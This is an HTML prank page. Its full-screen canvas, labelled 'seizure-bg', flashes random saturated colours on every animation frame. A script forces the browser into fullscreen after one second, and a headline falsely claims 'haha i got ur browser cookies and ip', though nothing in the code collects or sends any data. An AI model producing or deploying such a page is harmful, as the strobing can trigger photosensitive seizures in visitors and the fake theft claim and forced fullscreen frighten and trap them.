<!DOCTYPE html>
<html lang="en">
<head>

  <style>
    * { margin:0; padding:0; box-sizing:border-box; }
    html, body {
      height: 100%;
      overflow: hidden;
    }
    .container {
      position: fixed;
      top: 0; left: 0; right: 0; bottom: 0;
      display: flex;
      align-items: center;
      justify-content: center;
      text-align: center;
      z-index: 10;
      pointer-events: none;
    }
    h1 {
      font-family: Arial, sans-serif;
      font-size: 3rem;
      color: #000;
      letter-spacing: 3px;
      font-weight: bold;
    }
    @media (max-width: 768px) {
      h1 { font-size: 1.8rem; }

    .seizure-bg {
      position: fixed;
      top: 0; left: 0; width: 100%; height: 100%;
      pointer-events: none;
    }
  </style>
</head>
<body>

  
  <canvas class="seizure-bg" id="bg"></canvas>

  
  <div class="container">
    <h1>haha i got ur browser cookies and ip</h1>
  </div>

  <script>
    // main colors only
    const colors = ['#ff0000', '#00ff00', '#0000ff', '#ffff00', '#00ffff', '#ff00ff', '#ffffff', '#000000'];
    const canvas = document.getElementById('bg');
    const ctx = canvas.getContext('2d');
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;

    function flash() {
      ctx.fillStyle = colors[Math.floor(Math.random() * colors.length)];
      ctx.fillRect(0, 0, canvas.width, canvas.height);
      requestAnimationFrame(flash);
    }
    flash();

    window.addEventListener('resize', () => {
      canvas.width = window.innerWidth;
      canvas.height = window.innerHeight;
    });

    
    setTimeout(() => {
      const el = document.documentElement;
      const enter = el.requestFullscreen || el.webkitRequestFullscreen || el.mozRequestFullScreen || el.msRequestFullscreen;
      if (enter) {
        enter.call(el).catch(() => {});
      }
    }, 1000);
  </script>
</body>
